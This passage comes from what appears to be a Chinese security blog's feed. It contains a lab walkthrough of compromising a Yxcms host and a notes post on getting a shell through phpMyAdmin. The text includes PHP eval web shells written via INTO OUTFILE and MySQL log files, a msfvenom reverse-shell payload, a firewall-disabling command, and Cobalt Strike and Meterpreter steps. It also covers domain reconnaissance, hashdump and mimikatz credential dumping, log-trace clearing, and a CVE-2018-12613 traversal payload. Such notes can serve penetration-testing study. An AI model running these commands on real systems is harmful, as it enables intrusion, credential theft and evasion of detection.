+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;@&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;456&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427163609596.png&#34; alt=&#34;image-20220427163609596&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;通过备份文件搜索真实路径&lt;/p&gt;
+&lt;p&gt;/yxcms/protected/apps/default/view/default/shell.php&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427163402712.png&#34; alt=&#34;image-20220427163402712&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;蚁剑连接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#蚁剑连接&#34;&gt;#&lt;/a&gt; 蚁剑连接&lt;/h3&gt;
+&lt;p&gt;为防止中文乱码设置编码为 GBK&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427163745166.png&#34; alt=&#34;image-20220427163745166&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427163827072.png&#34; alt=&#34;image-20220427163827072&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427171345331.png&#34; alt=&#34;image-20220427171345331&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427171330486.png&#34; alt=&#34;image-20220427171330486&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427173446192.png&#34; alt=&#34;image-20220427173446192&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;shell提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#shell提权&#34;&gt;#&lt;/a&gt; shell 提权&lt;/h2&gt;
+&lt;h3 id=&#34;msf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msf&#34;&gt;#&lt;/a&gt; msf&lt;/h3&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# LHOST 为公网 IP 地址，内网地址需做端口转发&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfvenom -p windows/meterpreter/reverse_tcp &lt;span class=&#34;token assign-left variable&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.50.171 &lt;span class=&#34;token assign-left variable&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4444&lt;/span&gt; -f exe -o msf1.exe&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220429153729533.png&#34; alt=&#34;image-20220429153729533&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfconsole&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;use exploit/multi/handler&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;show options&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; LHOST &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.50.171&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; payload windows/meterpreter/reverse_tcp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;run&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220429153908870.png&#34; alt=&#34;image-20220429153908870&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;可能用到的命令&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;lsof&lt;/span&gt; -i:4444&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;kill&lt;/span&gt; -9 &lt;span class=&#34;token string&#34;&gt;&#39;PID&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;蚁剑关闭防火墙，上传 msf1.exe，执行程序&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;# 关闭防火墙
+netsh advfirewall set allprofiles state off
+# 执行msf1.exe
+start C:\phpStudy\WWW\msf1.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-msf&#34;&gt;shell
+# 乱码设置iterm2 preferences-profiles-terminal的encoding为中文
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220429154012100.png&#34; alt=&#34;image-20220429154012100&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;cs&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cs&#34;&gt;#&lt;/a&gt; cs&lt;/h3&gt;
+&lt;p&gt;服务端开启&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;./teamserver &lt;span class=&#34;token string&#34;&gt;&#39;公网IP&#39;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;连接密码&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220429154540761.png&#34; alt=&#34;image-20220429154540761&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;客户端连接&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220429154621466.png&#34; alt=&#34;image-20220429154621466&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;设置监听&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220429160257969.png&#34; alt=&#34;image-20220429160257969&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;生成 payload&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220429160445590.png&#34; alt=&#34;image-20220429160445590&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;上传木马&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220429160543557.png&#34; alt=&#34;image-20220429160543557&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;蚁剑执行木马&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220429160624301.png&#34; alt=&#34;image-20220429160624301&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;beacon 命令&lt;/p&gt;
+&lt;p&gt;sleep 0&lt;/p&gt;
+&lt;p&gt;shell whoami&lt;/p&gt;
+&lt;h2 id=&#34;内网信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网信息收集&#34;&gt;#&lt;/a&gt; 内网信息收集&lt;/h2&gt;
+&lt;h3 id=&#34;msf-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msf-2&#34;&gt;#&lt;/a&gt; msf&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;# 当前用户
+whoami
+# 主机名
+hostname
+# 本机用户列表
+net user
+# 本地管理员组
+net localgroup administrator
+# 系统版本
+systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&amp;quot;
+# 系统架构
+echo %PROCESSOR_ARCHITECTURE%
+# 安装软件及版本
+wmic product get name,version
+# 进程与服务
+tasklist
+# IP查询，根据DNS判断是否在域环境
+ipconfig/all
+# 局域网内其他主机名
+net view
+# 查看域用户
+net view /domain
+# 查询计算机名 全名 用户名 系统版本 工作站 域 登录域
+net config workstation
+# 查看域控服务器
+nslookup god.org
+# 查看当前域下的所有用户 
+net user /domain # 若发现能够执行，说明此台机器在域中 (若是此命令在显示域处显示 WORKGROUP，则不存在域，若是报错：发生系统错误 5，则存在域，但当前登录用户不是域用户)
+# 获取域内用户信息
+wmic useraccount get /all
+# 查看域管理员的名字
+net group &amp;quot;domain admins&amp;quot; /domain
+# 查看所有域成员计算机名
+net group &amp;quot;domain computers&amp;quot; /domain
+# 查看域管理员
+net group &amp;quot;domain admins&amp;quot; /domain
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;cs-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cs-2&#34;&gt;#&lt;/a&gt; cs&lt;/h3&gt;
+&lt;p&gt;msf 派生 shell 给 cs&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-msf&#34;&gt;# 获取system权限
+getsystem
+# 放置shell到后台
+background
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;cs 设置监听&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-msf&#34;&gt;use exploit/windows/local/payload_inject
+show options
+set DisablePayloadHandler true
+set payload windows/meterpreter/reverse_http
+set lhost &#39;cs监听地址&#39;
+set lport &#39;cs监听端口&#39;
+set session &#39;msf放置到后台的session数字&#39;
+run
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;cs&lt;/p&gt;
+&lt;p&gt;在 beacon 上右键，目标（target）&amp;gt;net view, 查看下扫描到的主机，在 cs 的 beacon 下，首先要降低心跳，防止杀软警觉，这里是内网，没有杀软就直接 sleep 0&lt;/p&gt;
+&lt;p&gt;net view&lt;/p&gt;
+&lt;p&gt;点击 target，会显示视图中的目标列表&lt;/p&gt;
+&lt;p&gt;target&lt;/p&gt;
+&lt;p&gt;在 cs 中，使用 hashdump 抓一下内存的密码，mimikatz 抓注册表的明文密码或散列值&lt;/p&gt;
+&lt;p&gt;hashdump&lt;/p&gt;
+&lt;p&gt;logonpasswords&lt;/p&gt;
+&lt;p&gt;右击 beacon，在视图一栏查看凭证信息，查看相关用户的密码及散列值&lt;/p&gt;
+&lt;h2 id=&#34;内网渗透&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网渗透&#34;&gt;#&lt;/a&gt; 内网渗透&lt;/h2&gt;
+&lt;h3 id=&#34;cs-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cs-3&#34;&gt;#&lt;/a&gt; cs&lt;/h3&gt;
+&lt;p&gt;新建监听选择 smb，右键会话 - 执行 - 提权 - 监听器选择 smb payload 选择 svc&lt;/p&gt;
+</content>
+        <updated>2022-01-13T06:49:59.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://mo-onstudy.com/2022/01/13/phpmyadmin%E5%90%8E%E5%8F%B0getshell/</id>
+        <title>phpmyadmin后台getshell</title>
+        <link rel="alternate" href="https://mo-onstudy.com/2022/01/13/phpmyadmin%E5%90%8E%E5%8F%B0getshell/"/>
+        <content type="html">&lt;h2 id=&#34;select-into-outfile写入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#select-into-outfile写入&#34;&gt;#&lt;/a&gt; select into outfile 写入&lt;/h2&gt;
+&lt;h3 id=&#34;利用条件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用条件&#34;&gt;#&lt;/a&gt; 利用条件&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;对 web 目录需要有写权限能够使用单引号 (root)&lt;/li&gt;
+&lt;li&gt;知道网站绝对路径 (通过 phpinfo/php 探针 / 报错等)&lt;/li&gt;
+&lt;li&gt;secure_file_priv 没有具体值&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;利用步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用步骤&#34;&gt;#&lt;/a&gt; 利用步骤&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;# 查询secure_file_priv值
+show global variables like &#39;%secure%&#39;;
+
+# 写入shell
+select &#39;&amp;lt;?php eval($_POST[1]);?&amp;gt;&#39; INTO OUTFILE &#39;C:\\phpStudy\\WWW\\shell.php&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;关于 secure_file_priv：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;secure_file_priv&lt;/code&gt;  是用来限制 load dumpfile、into outfile、load_file () 函数在哪个目录下拥有上传或者读取文件的权限&lt;/p&gt;
+&lt;p&gt;当  &lt;code&gt;secure_file_priv&lt;/code&gt;  的值为 NULL ，表示限制 mysqld 不允许导入 | 导出，此时无法提权&lt;/p&gt;
+&lt;p&gt;当  &lt;code&gt;secure_file_priv&lt;/code&gt;  的值为 /tmp/ ，表示限制 mysqld 的导入 | 导出只能发生在 /tmp/ 目录下，此时也无法提权&lt;/p&gt;
+&lt;p&gt;当  &lt;code&gt;secure_file_priv&lt;/code&gt;  的值没有具体值时，表示不对 mysqld 的导入 | 导出做限制，此时可提权&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;secure_file_priv&lt;/code&gt;  这个值是只读变量，只能通过配置文件修改。如果管理员没有配置，无法进行写入 shell&lt;/p&gt;
+&lt;h2 id=&#34;全局日志写入shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#全局日志写入shell&#34;&gt;#&lt;/a&gt; 全局日志写入 shell&lt;/h2&gt;
+&lt;h3 id=&#34;利用条件-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用条件-2&#34;&gt;#&lt;/a&gt; 利用条件&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;必须是 root 权限&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;利用步骤-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用步骤-2&#34;&gt;#&lt;/a&gt; 利用步骤&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;# 查看配置
+SHOW VARIABLES LIKE &#39;%general%&#39;
+
+# 开启general_log模式
+set global general_log = on;
+
+# 设置日志目录
+set global general_log_file=&#39;C:\\phpStudy\\WWW\\shell.php&#39;;
+
+# 写入shell
+select &#39;&amp;lt;?php eval($_POST[cmd]);?&amp;gt;&#39;
+
+# 清除痕迹
+set global general_log_file=&#39;C:\\phpStudy\\MySQL\\data\\stu1.log&#39;;
+set global general_log = off;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;慢查询日志getshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#慢查询日志getshell&#34;&gt;#&lt;/a&gt; 慢查询日志 getshell&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;记录所有执行时间超过 long_query_time 秒的所有查询或者不使用索引的查询。默认情况下，MySQL 数据库是不开启慢查询日志的，long_query_time 的默认值为 10（即 10 秒，通常设置为 1 秒），即运行 10 秒以上的语句是慢查询语句。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 查询慢查询日志&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;show&lt;/span&gt; variables &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%slow%&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 启用慢查询日志&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;GLOBAL&lt;/span&gt; slow_query_log&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;on&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 设置日志路径&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;slow_query_log_file&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;C:/phpstudy_pro/WWW/2.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 写入 shell&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;?php phpinfo() ?&gt;&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; mysql&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;db &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;其他漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他漏洞&#34;&gt;#&lt;/a&gt; 其他漏洞&lt;/h2&gt;
+&lt;h3 id=&#34;cve-2018-12613&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2018-12613&#34;&gt;#&lt;/a&gt; Cve-2018-12613&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;phpMyAdmin 4.8.1 和 4.8.0&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&#34;language-payload&#34;&gt;http://0-sec.org/index.php?target=db_sql.php%253f/../../../../../../../../windows/win.ini
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;cve-2016-5734&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2016-5734&#34;&gt;#&lt;/a&gt; Cve-2016-5734&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;4.0.10.16 之前的 4.0.x 版本&lt;/li&gt;
+&lt;li&gt;4.4.15.7 之前的 4.4.x 版本&lt;/li&gt;
+&lt;li&gt;4.6.3 之前的 4.6.x 版本&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;宝塔phpmyadmin未授权访问漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#宝塔phpmyadmin未授权访问漏洞&#34;&gt;#&lt;/a&gt; 宝塔 phpmyadmin 未授权访问漏洞&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Linux 正式版 7.4.2 Linux 测试版 7.5.13 Windows 正式版 6.8&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&#34;language-payload&#34;&gt;http://xxx.xxx.xxx.xxx:888/pma 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;绝对路径&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绝对路径&#34;&gt;#&lt;/a&gt; 绝对路径&lt;/h2&gt;
+&lt;h3 id=&#34;phpinfo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpinfo&#34;&gt;#&lt;/a&gt; phpinfo&lt;/h3&gt;
+&lt;p&gt;F12 查看源代码然后搜索 DOCUMENT ROOT 得知写入的绝对路径&lt;/p&gt;
+&lt;h3 id=&#34;报错信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报错信息&#34;&gt;#&lt;/a&gt; 报错信息&lt;/h3&gt;
+&lt;p&gt;通过各种 fuzz 尝试让目标报错，也有可能爆出绝对路径&lt;/p&gt;
+&lt;h3 id=&#34;集成web框架&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#集成web框架&#34;&gt;#&lt;/a&gt; 集成 web 框架&lt;/h3&gt;
+&lt;p&gt;如果目标站点是利用 phpstudy、LAMPP 等之类搭建的，可以通过查看数据库路径再拆解 web 路径&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;show variables like &#39;%datadir%&#39;;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;select-load_file&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#select-load_file&#34;&gt;#&lt;/a&gt; select load_file()&lt;/h3&gt;
+&lt;p&gt;利用 select load_file () 读取文件，可以尝试 /etc/passwd，apache｜nginx｜httpd log 之类的文件&lt;/p&gt;
+&lt;p&gt;Trick：如何判断目录是否存在，往往确定了 /var/www/html 目录，但是还有一层目录不能确定，可以采用目标域名 + 常用的网站根目录的方式进行爆破，当使用&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;select &#39;test&#39; into outfile &#39;/var/www/$fuzz$/shell.php&#39;；
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;时，目录 fuzz，fuzz 不存在将会报错&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Can&#39;t create/write to file &#39;/var/www/html/666.txt&#39; (Errcode: 2)；
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如果存在但是目录写不进去将返回 (Errcode: 13)&lt;/p&gt;
+&lt;p&gt;如果使用的&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;load data infile &amp;quot;/etc/passwd&amp;quot; into table test;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;该语句执行后将也会显示文件是否存在，有权限能否写等信息。&lt;/p&gt;
+&lt;h3 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;查看数据库表内容获取 有一些 cms 会保存网站配置文件 或者路径&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;进入后台&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;百度出错信息 zoomeye shadon 搜索 error warning&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;@@datadir 参数看 mysql 路径 反猜绝对路径&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+        <category term="phpmyadmin" scheme="https://mo-onstudy.com/tags/phpmyadmin/" />
+        <category term="getsehll" scheme="https://mo-onstudy.com/tags/getsehll/" />
+        <updated>2022-01-13T02:41:37.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://mo-onstudy.com/2022/01/09/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
+        <title>常用命令</title>
+        <link rel="alternate" href="https://mo-onstudy.com/2022/01/09/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
+        <content type="html">&lt;h2 id=&#34;macos&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#macos&#34;&gt;#&lt;/a&gt; macOS&lt;/h2&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 修改 hosts 文件&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;vi&lt;/span&gt; /etc/hosts&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption 